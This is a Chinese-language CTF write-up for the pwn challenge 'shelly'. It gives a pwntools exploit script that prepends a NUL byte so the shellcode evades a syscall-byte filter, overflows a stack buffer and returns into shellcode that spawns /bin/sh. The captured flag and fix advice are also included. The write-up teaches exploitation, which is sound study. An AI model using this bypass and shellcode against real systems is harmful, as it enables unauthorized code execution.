# shelly

## 题目简述

程序先泄露 256 字节栈缓冲区地址，再用 `fgets(buffer, 512, stdin)` 产生栈溢出。栈可执行且没有 canary，但程序会扫描输入，发现连续字节 `0f 05`（`syscall`）就退出。扫描遇到第一个 NUL 字节时提前停止。

## 解题过程

利用扫描器的字符串语义与 `fgets` 的二进制输入差异：在 payload 开头放一个 NUL，真实 shellcode 从第二字节开始。过滤循环立刻在位置 0 停止，不会看到后面的 `syscall`；返回地址则指向泄露地址加 1。

```python
from pwn import asm, p64, shellcraft

stack = leaked_buffer_address
shellcode = asm(shellcraft.sh())

payload = b"\x00" + shellcode
payload = payload.ljust(264, b"A")
payload += p64(stack + 1)
```

发送后返回到可执行栈，shellcode 启动 `/bin/sh`。读取 `flag.txt` 得到：

```text
tjctf{s4lly_s3lls_s34sh3lls_50973fce}
```

## 方法总结

- 过滤器按 NUL 终止的 C 字符串检查数据，而漏洞读取和执行路径处理的是更长字节序列，形成了检查视图与执行视图差异。
- 栈地址泄露消除了 ASLR 对 shellcode 落点的影响，`buffer+1` 又精确跳过了用于截断检查的 NUL。
- 修复应限制读取长度并启用 NX/canary；搜索某条 syscall 字节序列既容易绕过，也不能替代内存安全。
